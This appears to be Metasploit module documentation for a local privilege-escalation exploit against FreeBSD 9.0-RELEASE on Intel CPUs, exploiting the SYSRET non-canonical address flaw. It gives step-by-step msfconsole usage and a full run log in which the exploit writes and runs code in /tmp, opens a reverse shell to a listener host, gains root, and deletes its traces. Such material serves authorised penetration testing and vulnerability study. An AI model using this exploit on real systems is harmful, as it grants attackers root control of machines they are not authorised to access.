## Description

  This module exploits a vulnerability in the FreeBSD 9.0-RELEASE (x64)
  kernel, when running on 64-bit Intel processors.

  By design, 64-bit processors following the X86-64 specification will
  trigger a general protection fault (GPF) when executing a SYSRET
  instruction with a non-canonical address in the RCX register.

  However, Intel processors check for a non-canonical address prior to
  dropping privileges, causing a GPF in privileged mode. As a result,
  the current userland RSP stack pointer is restored and executed,
  resulting in privileged code execution.


## Vulnerable Application

  This module has been tested successfully on FreeBSD 9.0-RELEASE.


## Verification Steps

  1. Start `msfconsole`
  2. Get a session
  3. `use exploit/freebsd/local/intel_sysret_priv_esc`
  4. `set SESSION <SESSION>`
  5. `check`
  6. `run`
  7. You should get a new *root* session


## Options

  **SESSION**

  Which session to use, which can be viewed with `sessions`

  **WritableDir**

  A writable directory file system path. (default: `/tmp`)


## Scenarios

### FreeBSD 9.0-RELEASE

  ```
  msf5 > use exploit/freebsd/local/intel_sysret_priv_esc 
  msf5 exploit(freebsd/local/intel_sysret_priv_esc) > set session 1
  session => 1
  msf5 exploit(freebsd/local/intel_sysret_priv_esc) > set lhost 123.123.123.188
  lhost => 123.123.123.188
  msf5 exploit(freebsd/local/intel_sysret_priv_esc) > run

  [!] SESSION may not be compatible with this module.
  [*] Started reverse TCP handler on 123.123.123.188:4444 
  [+] FreeBSD version 9.0-RELEASE appears vulnerable
  [+] System architecture amd64 is supported
  [+] hw.model: Intel(R) Core(TM) i9-1337 CPU @ 9.99GHz is vulnerable
  [*] Writing '/tmp/.mTaR4rAPd.c' (4781 bytes) ...
  [*] Max line length is 131073
  [*] Writing 4781 bytes in 1 chunks of 17475 bytes (octal-encoded), using printf
  [*] Writing '/tmp/.LBGkIVh' (218 bytes) ...
  [*] Max line length is 131073
  [*] Writing 218 bytes in 1 chunks of 614 bytes (octal-encoded), using printf
  [*] Launching exploit...
  [*] [+] SYSRET FUCKUP!!
  [*] [+] Start Engine...
  [*] [+] Crotz...
  [*] [+] Crotz...
  [*] [+] Crotz...
  [*] [+] Woohoo!!!
  [+] Success! Executing payload...
  [*] Command shell session 2 opened (123.123.123.188:4444 -> 123.123.123.136:61024) at 2018-12-09 10:40:16 -0500
  [+] Deleted /tmp/.mTaR4rAPd.c
  [+] Deleted /tmp/.mTaR4rAPd
  [+] Deleted /tmp/.LBGkIVh

  id
  uid=0(root) gid=0(wheel) groups=0(wheel)
  uname -a
  FreeBSD freebsd-9-0 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64
  ```

